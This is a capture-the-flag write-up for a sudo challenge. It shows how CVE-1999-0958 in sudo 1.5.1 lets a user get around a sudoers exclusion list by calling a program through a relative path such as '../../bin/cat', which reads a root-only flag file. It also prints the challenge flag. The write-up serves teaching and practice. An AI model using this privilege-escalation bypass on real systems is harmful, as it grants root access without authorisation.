# Writeup

### Clues from Initial Context
The prompt of this challenge is hinting heavily towards `sudo` and using `..`. When you get into the docker container running the challenge, there is also a README that has `..` instead of '.' at the end of it's sentences. On top of that, the writer of the README says they've "dotdotted their i's and dotted their t's", further enforcing that this challenge will have something to do with `.` or `..`.

### Information Gathering

In the starting directory of the challenge is the flag.txt. Trying:
```
$ cat flag.txt
```
will not work, and will give you an error since flag.txt is only readable by root. You can try to elevate your privileges using `sudo` to get read access like this:
```
$ sudo cat flag.txt
```
but this also does not work. The user you are logged in as, `ctf_player`, is excluded in the sudoers file from using anything that might allow them to read or write the contents of a file only readable or writable by root.

Since we are running an old version of `sudo`, we can look at vulnerabilities from old versions. It tells us in the `README.txt` that we are running version 1.5.1, and we can confirm this by running:
```
$ sudo -V
```
which will tell us that we are indeed running version 1.5.1.

Checking for vulnerabilites in old versions of `sudo`, we come across a [CVE from 1999](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0958) that has exactly what we need. Using CVE-1999-0958, we can bypass the exclusion list and use `sudo` to read the flag.txt as root.

### Solution

To bypass the exclusion list, all we need to do is run any program that we'd like to read the flag.txt with using a relative path starting with either `./` or `../`. 

Running:
```
$ sudo ../../bin/cat flag.txt
```
while in the `/home/ctf` directory will prompt the user for their password instead of telling them that they are not allowed to perform this action. After typing in the password, `cat` will be run as root on flag.txt, giving us the flag:
```
flag{1_sud0nt_und3rs74nd_h0w_y0u_g0t_7h1s_f1ag}
```

Now, we have our flag and have completed the challenge.
